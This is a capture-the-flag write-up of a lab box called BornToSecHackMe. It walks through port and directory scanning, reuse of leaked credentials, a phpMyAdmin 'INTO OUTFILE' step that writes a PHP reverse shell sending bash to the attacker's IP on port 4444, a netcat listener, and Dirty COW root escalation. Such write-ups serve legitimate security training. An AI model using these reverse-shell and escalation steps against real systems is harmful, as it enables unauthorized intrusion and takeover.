The **Boot2Root** project is an entry-level challenge in **computer security** that allows participants to explore **ethical hacking** and **server exploitation** techniques. The goal is to gain **root access** (administrator privileges) on a server by discovering and exploiting vulnerabilities. The project is hands-on and emphasizes learning through practice, using a variety of tools and methods to solve real-world security challenges.

## Retrieve IP Address

The first step was to retrieve the IP address of the box. Initially, I tried using `VBoxManage` to get the IP address, but it didn’t work. I almost gave up at this step—just kidding, of course! 😄

Instead, I decided to scan the network using the following script:

```bash
for ip in $(seq 1 254); do ping -c 1 10.13.100.$ip | grep "64 bytes" & done > ip00
```

The first scan was done with no box running. After starting the box, I ran the script again and compared the outputs. In the second output, I noticed a new IP address, which turned out to be the IP of the box. Finally, I successfully retrieved the IP address of the box.

```bash
for ip in $(seq 1 254); do ping -c 1 10.13.100.$ip | grep "64 bytes" & done > ip01
```

After retrieving the IP address, I needed to find the open ports on this box. I didn't have the `nmap` tool to scan the ports—haha, I’m just a beginner! 😄 So, I tried using a script to scan all the open ports and save them to a file:

```bash
for port in $(seq 1 9999); do
  echo "Scanning 10.13.100.236 on port $port..."
  nc -zv 10.13.100.236 $port 2>&1 | grep succeeded
done > port
```

Simple bash loop that scans ports on the host `10.13.100.236` from 1 to 9999 using `netcat` (`nc`)

The Output:

```bash
Connection to 10.13.100.236 port 21 [tcp/ftp] succeeded!
Connection to 10.13.100.236 port 22 [tcp/ssh] succeeded!
Connection to 10.13.100.236 port 80 [tcp/http] succeeded!
Connection to 10.13.100.236 port 143 [tcp/imap] succeeded!
Connection to 10.13.100.236 port 443 [tcp/https] succeeded!
Connection to 10.13.100.236 port 993 [tcp/imaps] succeeded!
```

The second option is to use the `nmap` tool to scan the ports:

```bash
root@debian:/home/yoyo# nmap 10.13.100.236
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

To scan directories on a server using an IP address, I use `Dirb`, a command-line tool that utilizes a wordlist to discover directories and files on a web server:

```bash

dirb https://10.13.100.236/
```

You can also use `Gobuster`, a tool for brute-forcing URIs (directories and files) on web servers. It’s fast and also relies on a wordlist:

```bash
gobuster dir -u https://10.13.100.236 -w rockyou.txt -k

```

---

The Output:

```bash
root@debian:/home/yoyo# dirb https://10.13.100.236/
[...]
---- Scanning URL: https://10.13.100.236/ ----
+ https://10.13.100.236/cgi-bin/ (CODE:403|SIZE:290)
==> DIRECTORY: https://10.13.100.236/forum/
==> DIRECTORY: https://10.13.100.236/phpmyadmin/
+ https://10.13.100.236/server-status (CODE:403|SIZE:295)
==> DIRECTORY: https://10.13.100.236/webmail/
[...]
```

In this URL, https://10.13.100.236/forum/, I found a forum page titled "HackMe," which displays a few discussion threads, with only four registered users. The topics include "Welcome to this new Forum!", "Probleme login?", "Gasolina," and "Les mouettes!

<img width="872" alt="Screen Shot 2024-10-19 at 11 48 13 PM" src="https://github.com/user-attachments/assets/83e8589d-dab2-4086-9893-49687b2e3606" />


I tried to navigate to "Probleme login" and found a password: https://10.13.100.236/forum/index.php?id=6

```
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3:
```

Then, I logged in with the username `lmezard` and the password `!q\]Ej?*5K5cy*AJ`.

<img width="796" alt="Screen Shot 2024-10-20 at 12 00 32 AM" src="https://github.com/user-attachments/assets/29ae97db-b57c-42ef-bbe1-d80cf2d6bda5" />

I found the email address `laurie@borntosec.net` in this form.

---

<img width="831" alt="Screen Shot 2024-10-20 at 12 03 36 AM" src="https://github.com/user-attachments/assets/c9848bda-f7fb-4e6a-be91-caa86cb2f2f7" />


Now I have the email address `laurie@borntosec.net` and the password `!q\]Ej?*5K5cy*AJ`. Let's try to log in to the email box. https://10.13.100.236/webmail/

<img width="826" alt="Screen Shot 2024-10-20 at 12 08 53 AM" src="https://github.com/user-attachments/assets/879382f1-f359-47a6-9af6-59d16d4ccf9a" />


I found an email message that contains the username and password for the database:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

---

Then, I logged into the database with the username `root` and the password `Fg-'kKXBj87E:aJ$`.

https://10.13.100.236/phpmyadmin/

<img width="923" alt="Screen Shot 2024-10-20 at 12 15 26 AM" src="https://github.com/user-attachments/assets/2a557bd6-ce86-482e-a6e9-211f52f4e04a" />


## SQL injection

After logging into the database, I ran an SQL query (SQL injection) to create a reverse shell to  execute commands on the box:

```sql
SELECT '<?php system("bash -c \'exec bash -i &>/dev/tcp/10.13.100.96/4444 <&1\'"); ?>' INTO OUTFILE '/var/www/forum/templates_c/reverse_shell.php.php';
```
<img width="1186" alt="Screen Shot 2024-10-20 at 12 33 33 AM" src="https://github.com/user-attachments/assets/3926edc4-531d-40d2-8b6d-9636c8fae7b8" />

The SQL statement used in a SQL injection attack to create a web shell on a vulnerable server.

- **`SELECT` Statement**:
    - This part is selecting a PHP command that will create a reverse shell.
- **`'<?php system("bash -c \'exec bash -i &>/dev/tcp/10.13.100.96/4444 <&1\'"); ?>'`**:
    - This string is a PHP script that, when executed, will open a reverse shell connection back to the attacker's machine at IP `10.13.100.96` on port `4444`.
    - The `system` function in PHP is used to execute the command passed to it.
- **`INTO OUTFILE '/var/www/forum/templates_c/`**reverse_shell.php**`';`**:
    - This part writes the selected PHP script to a file named reverse_shell.php located in the specified directory on the server. This file would then be accessible via a web server, allowing the attacker to execute the PHP code

After that, I set up a listener on my local machine or VM using Netcat:

```
nc -lvnp 4444
```

**`nc`**: This is the Netcat command

**`-l`**: This option tells Netcat to listen for incoming connection

**`-v`**: This stands for "verbose." It provides more detailed output

**`-n`**: This option prevents DNS lookups.

**`-p 4444`**: This specifies the port number (`4444`) on which the listener will wait for incoming connections.

I made an HTTP request to a web server, specifically targeting a PHP file that may contain malicious code:

```bash
curl -k https://10.13.100.236/forum/templates_c/reverse_shell.php
```

Then, I can execute command-line instructions as the user `www-data`. For example:

```bash
www-data@BornToSecHackMe:/var/www/forum/templates_c$ whoami
whoami
www-data
www-data@BornToSecHackMe:/var/www/forum/templates_c$
```

## Privilege escalation

After checking the kernel release date, I found it to be **Wed Sep 9 11:27:47 UTC 2015**. I did some research and discovered that vulnerabilities like **Dirty COW** (CVE-2016-5195) were present in the operating system around that time.

```jsx
www-data@BornToSecHackMe:/var/www/forum/templates_c$ uname -a
uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
www-data@BornToSecHackMe:/var/www/forum/templates_c
```

### Exploit: Dirty COW Privilege Escalation 
Dirty COW (Copy-On-Write) is a race condition vulnerability in the Linux kernel that allows an attacker to gain root privileges by modifying read-only files. This exploit works by racing madvise(MADV_DONTNEED) against  ptrace() to overwrite protected system files such as /etc/passwd.

### How It Works
The exploit leverages Copy-On-Write (COW), which is a kernel memory management feature that allows multiple processes to share the same memory page until one tries to modify it. The exploit forces the kernel to replace a read-only file's memory page with a modified version.

### Steps to Exploit Dirty COW
1. Define user details for a new /etc/passwd entry (e.g., a root user with ID 0).
2. Generate a password hash for the new user.
3. Open the target file (/etc/passwd) and map it into memory using mmap().
4. Fork a child process to execute ptrace() and madvise() attacks.
5. Child process:
 - Creates a thread that continuously runs madvise() to invalidate memory pages.
 - Stops itself (SIGSTOP) to allow the parent process to inject data.
6. Parent process:
 - Uses ptrace(PTRACE_POKETEXT) to modify the read-only mapped memory with new user credentials.
  
Compile the `dirty.c` file:

```jsx
gcc -pthread dirty.c -o dirty -lcrypt
```

Run the compiled exploit:

```jsx
./dirty
```

Spawn a TTY shell because the shell environment is not stable:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Switch to the root user using the `su` command:

```jsx
www-data@BornToSecHackMe:/var/www/forum/templates_c$ su yo
Password: yo
root@BornToSecHackMe:~#
```
